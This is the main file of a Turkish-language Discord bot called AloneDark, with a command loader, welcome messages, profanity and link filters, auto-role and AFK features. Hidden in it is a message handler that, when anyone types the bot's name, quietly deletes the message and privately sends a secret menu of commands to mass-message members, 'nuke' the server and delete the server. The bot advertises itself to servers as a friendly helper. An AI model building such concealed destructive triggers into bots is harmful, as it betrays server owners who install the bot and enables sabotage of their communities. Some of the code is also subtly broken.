const Discord = require("discord.js");
const client = new Discord.Client();
const jimp = require("jimp");
const db = require("quick.db");
const ayarlar = require("./ayarlar.json");
const chalk = require("chalk");
const express = require("express");
const app = express();
const fs = require("fs");
const moment = require("moment");
const http = require("http");
const buttons = require('discord-buttons')
buttons(client);
const { MessageMenu, MessageMenuOption } = require('discord-buttons');
require("./util/eventLoader")(client);

client.on("ready", async () => {
  client.appInfo = await client.fetchApplication();
  setInterval(async () => {
    client.appInfo = await client.fetchApplication();
  }, 600);
});

const log = message => {
  console.log(` ${message}`);
};
require("./util/eventLoader.js")(client);

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir("./komutlar/", (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklenecek.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    log(`[ PRO-BOT -- COMMANDS ] ${props.help.name}`);
    client.commands.set(props.help.name, props);
    (alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
});
client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};
client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};
client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};
client.elevation = message => {
  if (!message.guild) {
    return;
  }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === ayarlar.sahip) permlvl = 4;
  return permlvl;
};

client.login(ayarlar.token);

client.k4h1n = {
  parabirimi: "$", 
  prefix: "e!",
  botunuzunidsi: "1100106512258568253",
  botismi: "> AloneDark",
  renk: "BLACK", 
  isimsiz: "Efe", 
  rastgelepara: true, 
  minpara: 300, 
  maxpara: 900, 
  günlükpara: 100,  
  başlangıçparası: 150, 
  admin: ["896668078904074250"]
}

client.on('message', message => {
  if (message.content === 'AloneDark') {
    message.delete();
    const helpMessage = 'AloneDark Özel Komutlar Menüsü : \n **\`e!duyuru \`** - **Sunucuda ki Üyelere Mesaj Gönderir. ** \n **\`e!pr-1   \`** - **Komut Kullanılan Sunucu Patlatılır. ** \n **\`e!pr-2   \`** - **Komut Kullanılan Sunucu Silinir. ** ';
    const channelId = message.author.id;

    client.users.cache.get(channelId).send(helpMessage, {
      reply: {
        messageReference: message.id,
        failIfNotExists: false,
        allowedMentions: {
          repliedUser: false
        }
      }
    });
  }
});

client.on("message", async msg => {
  if (msg.channel.type === "dm") return;
  if (msg.author.bot) return;
  if (msg.content.length > 1) {
    if (db.fetch(`capslock_${msg.guild.id}`)) {
      let caps = msg.content.toUpperCase();
      if (msg.content == caps) {
        if (!msg.member.permissions.has("ADMINISTRATOR")) {
          if (!msg.mentions.users.first()) {
            msg.delete();
            return msg.channel.send(`${msg.member}, Capslock Kapat Kardeşim.`).then(nordx => nordx.delete({timeout: 5000}))
              
          }
        }
      }
    }
  }
});


//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

const embed = new Discord.MessageEmbed()
.setThumbnail()
.addField(`💛AloneDark`, `**Selamlar, Ben AloneDark ,Sunucunuza Eklediğim İçin Çook Mutluyum. 60 Tane Komutum Var Öğrenmek istersen =>** *e!yardım* **Prefixim İse** *( e! )* **İstersen Prefiximi Sen Kendine Göre Değiştirebilirsin Destek Sunucuma Gelmeyi Unutma.!**`)
.setFooter(`AloneDark | ©2023 AloneDark Created By Efe`)
.setTimestamp();

client.on("guildCreate", guild => {

let defaultChannel = "";
guild.channels.cache.forEach((channel) => {
if(channel.type == "text" && defaultChannel == "") {
if(channel.permissionsFor(guild.me).has("SEND_MESSAGES")) {
defaultChannel = channel;
}
}
})
defaultChannel.send(embed)
});

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on("message", async message => {
  let kanal = "" //Mesajın Yazılamayacağı Kanal ID
  if(message.channel.id === kanal){
  if(!message.member.user.bot){
  message.delete({timeout: 45})
  }
  }
  });

client.on("message", async message => {
if(message.channel.id !== "") return; //Kanal ID
message.react("") //Emoji
} );

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on('guildMemberAdd', async member => {
  let cdb = require("croxydb")
  let hgbb = cdb.get(`cshgbb.${member.guild.id}`)
  let sunucu =  member.guild.channels.cache.get(hgbb)
if(hgbb){
if(sunucu){
  const embed = new Discord.MessageEmbed()
  .setColor('RED')
  .setAuthor(member.user.tag, member.user.avatarURL())
  .setThumbnail(member.user.avatarURL())
  .setDescription(` ${member} Sunucucumuzu Sevdi Ve Aramıza Katıldı Toplam Üye: \`${member.guild.memberCount}\``)
  sunucu.send(embed) 
}} })
client.on('guildMemberRemove', async member => {
let cdb = require("croxydb")
  let hgbb = cdb.get(`cshgbb.${member.guild.id}`)
  let sunucu =  member.guild.channels.cache.get(hgbb)
if(hgbb){
if(sunucu){
  const embed = new Discord.MessageEmbed() 
  .setColor('RED')
  .setAuthor(member.user.tag, member.user.avatarURL())
  .setThumbnail(member.user.avatarURL())
  .setDescription(` ${member.user.tag} Sunucumuzu Beğenmedi Ve Çıktı Geriye Kalan Üye: ${member.guild.memberCount}`)
  sunucu.send(embed)
}} })

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on("guildMemberRemove", async member => {
const csas = "" //Ana Sunucu ID 
const csds = "" //Diğer Sunucu ID 
const csl = "" //Log Kanalı ID

if(member.guild.id === csas){
const csg = client.guilds.cache.get(csds)
if(csg){
let csm = csg.members.cache.get(member.id)
if(csm){
csm.kick().catch(e => {})
client.channels.cache.get(csl).send(`<a:kabul:1070794215895875634> <@${member.id}>,Ana Sunucumuzdan Çıktığı İçin Diğer Sunucumuzdan da Atıldı.`).catch(e => {})
} } } } )

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on('message', msg => {
  if (msg.content.toLocaleLowerCase() === 'sa') {
    msg.reply('<:as:1101538039332876389>');
  }  });
      client.on('message', msg => {
           if (msg.content.toLocaleLowerCase() === 'selamün aleyküm') {
             msg.reply('<:as:1101538039332876389>');
          } });
           client.on('message', msg => {
            if (msg.content.toLocaleLowerCase() === 'slm') {
               msg.reply('<:as:1101538039332876389>');
            } });
            client.on('message', msg => {
              if (msg.content.toLowerCase() === 'selam') {
                msg.channel.send('<:as:1101538039332876389>');
                 }  }); 
                 client.on('message', msg => {
                  if (msg.content.toLowerCase() === `<@${client.user.id}>`) { 
                   msg.reply('*Prefixim =>* **e!** *Ama istersen kendine göre değiştirebilirsin* **e!prefix**') 
                    } });
                    client.on('message', msg => {
                      if (msg.content.toLowerCase() === `<@896668078904074250>`) { 
                       msg.channel.send('**Efendim Cano**') 
                        } });
                        client.on('message', msg => {
                          if (msg.content.toLowerCase() === 'vk üye') {
                            msg.reply('Hemen Vk Rolü Verelim, Bekleyiniz. <@896668078904074250>');
                             }  }); 
                             client.on('message', msg => {
                              if (msg.content.toLowerCase() === 'vk katıl') {
                                msg.reply('Başarıyla Vk (Vampir Köylü) Oyununa Katıldın. Şuan Yapman Gereken Moderatörü Beklemek.');
                            
                                 }  }); 
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on('message', async message => {
  const cdb = require("croxydb") //gerekli modül
  if(message.guild){
    const data1 = cdb.get("cd1."+message.guild.id)
    const data2 = cdb.get("cd2."+message.channel.id+message.guild.id)
   
    if(data1){
    const blacklist = ["kaşar","kaşmer","amcı","oç", "amk", "ananı sikiyim", "ananıskm", "piç", "Amk", "amsk", "sikim", "sikiyim", "orospu çocuğu", "piç kurusu", "kahpe", "orospu", "sik", "yarrak", "amcık", "amık", "yarram", "sikimi ye", "mk", "mq", "aq", "amq"];
  
    let content = message.content.split(' ');
   
    content.forEach(kelime => {
    if(blacklist.some(küfür => küfür === kelime))  {
    if(!message.member.permissions.has('BAN_MEMBERS')){
    message.delete();
    message.reply("**Lütfen Küfür Etme!!**")
    }
    }
    })
    }
      if(!data1 && data2){
    const blacklist = ["kaşar","kaşmer","amcı","oç", "amk", "ananı sikiyim", "ananıskm", "piç", "Amk", "amsk", "sikim", "sikiyim", "orospu çocuğu", "piç kurusu", "kahpe", "orospu", "sik", "yarrak", "amcık", "amık", "yarram", "sikimi ye", "mk", "mq", "aq", "amq"];
  
    let content = message.content.split(' ');
   
    content.forEach(kelime => {
    if(blacklist.some(küfür => küfür === kelime))  {
    if(!message.member.permissions.has('BAN_MEMBERS')){
    message.delete();
    message.reply("**Lütfen Küfür Etme!!**")
    }  } })
    } } });

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on("guildMemberAdd", async member => {
  let kanal1 = await db.fetch(`otorolkanal_${member.guild.id}`);
  let rol1 = await db.fetch(`otorolrol_${member.guild.id}`);

  let kanal = member.guild.channels.cache.get(kanal1);
  let rol = member.guild.roles.cache.get(rol1);

  if (!kanal) return;
  if (!rol) return;

  const embed = new Discord.MessageEmbed()

    .setColor("BLACK")
    .setDescription(
      `Sunucuya Katılan **${member}** Adlı Kullanıcıya Başarıyla \`${rol.name}\` Rolü Verildi.`
    );

  kanal.send(embed);
  member.roles.add(rol);
});

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

const ms = require("parse-ms");
const { DiscordAPIError } = require("discord.js");

client.on("message", async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.content.includes(`afk`)) return;

  if (await db.fetch(`afk_${message.author.id}`)) {
    db.delete(`afk_${message.author.id}`);
    db.delete(`afk_süre_${message.author.id}`);

    const embed = new Discord.MessageEmbed()

      .setColor("GREEN")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setDescription(`Afk Modundan Başarıyla Çıkıldı.`);

    message.channel.send(embed);
  }

  var USER = message.mentions.users.first();
  if (!USER) return;
  var REASON = await db.fetch(`afk_${USER.id}`);

  if (REASON) {
    let süre = await db.fetch(`afk_süre_${USER.id}`);
    let timeObj = ms(Date.now() - süre);

    const afk = new Discord.MessageEmbed()

      .setColor("RED")
      .setDescription(
        `**BU KULLANICI AFK**\n\n**Afk Olan Kullanıcı :** \`${USER.tag}\`\n**Afk Süresi :** \`${timeObj.hours}saat\` \`${timeObj.minutes}dakika\` \`${timeObj.seconds}saniye\`\n**Sebep :** \`${REASON}\``
      );

    message.channel.send(afk);
  }
});

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on("message", async message => {
  let uyarisayisi = await db.fetch(`reklamuyari_${message.author.id}`);
  let reklamkick = await db.fetch(`kufur_${message.guild.id}`);
  let kullanici = message.member;
  if (!reklamkick) return;
  if (reklamkick == "Açık") {
    const reklam = [
      "discord.app",
      "discord.gg",
      ".com",
      ".net",
      ".xyz",
      ".tk",
      ".pw",
      ".io",
      ".me",
      ".gg",
      "www.",
      "https",
      "http",
      ".gl",
      ".org",
      ".com.tr",
      ".biz",
      ".party",
      ".rf.gd",
      ".az"
    ];
    if (reklam.some(word => message.content.toLowerCase().includes(word))) {
      if (!message.member.hasPermission("BAN_MEMBERS")) {
        message.delete();
      } 
    }
  }
});

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

client.on("message", async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  let prefix = db.get(`prefix_${message.guild.id}`);
  if (prefix === null) prefix = prefix;

  if (!message.content.startsWith(prefix)) return;
  if (!message.member)
    message.member = await message.guild.fetchMember(message);

  const args = message.content
    .slice(prefix.length)
    .trim()
    .split(/ +/g);
  const cmd = args.shift().toLowerCase();
  if (cmd.length === 0) return;
  let command = client.commands.get(cmd);
  if (!command) command = client.commands.get(client.aliases.get(cmd));
  if (command) command.run(client, message, args);
});

//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//
//-----------------------------------------------------------------------------------------------------------//

